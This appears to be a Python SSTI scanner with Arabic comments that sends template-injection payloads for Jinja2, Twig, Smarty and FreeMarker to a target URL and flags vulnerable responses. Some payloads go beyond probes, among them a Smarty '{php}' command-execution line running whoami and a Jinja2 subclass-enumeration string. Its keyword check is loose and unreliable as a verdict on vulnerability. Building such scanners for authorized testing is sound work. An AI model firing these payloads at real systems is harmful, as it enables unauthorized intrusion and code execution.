"""
Server-Side Template Injection (SSTI) Scanner
يفحص: Jinja2, Twig, Smarty, FreeMarker
"""

import requests
import urllib.parse
from typing import List, Dict

class TemplateInjectionScanner:
    
    def __init__(self, target: str):
        self.target = target
        self.vulnerabilities = []
        
        # Payloads
        self.payloads = {
            'jinja2': [
                "{{7*7}}",
                "{{config}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}"
            ],
            'twig': [
                "{{7*7}}",
                "{{_self.env.display()}}",
                "{{dump(app)}}"
            ],
            'smarty': [
                "{7*7}",
                "{$smarty.version}",
                "{php}echo `whoami`;{/php}"
            ],
            'freemarker': [
                "${7*7}",
                "${product.name}",
                "<#assign ex='whoami'>"
            ]
        }
    
    def scan(self) -> List[Dict]:
        """الفحص الرئيسي"""
        print(f"[+] فحص SSTI: {self.target}")
        
        for engine, payloads in self.payloads.items():
            for payload in payloads:
                try:
                    url = f"{self.target}?name={urllib.parse.quote(payload)}"
                    response = requests.get(url, timeout=10)
                    
                    if self._check_ssti(response, payload):
                        self.vulnerabilities.append({
                            'type': f'SSTI ({engine})',
                            'severity': 'critical',
                            'url': url,
                            'payload': payload,
                            'evidence': response.text[:200]
                        })
                        print(f"  [!] SSTI ({engine}) وُجدت!")
                        return self.vulnerabilities
                except:
                    pass
        
        return self.vulnerabilities
    
    def _check_ssti(self, response, payload: str) -> bool:
        """فحص نجاح SSTI"""
        # إذا كان 7*7 = 49
        if '7*7' in payload and '49' in response.text:
            return True
        
        # أنماط أخرى
        indicators = ['__class__', 'mro', 'subclasses', 'config', 'env', 'smarty']
        return any(ind in response.text for ind in indicators)
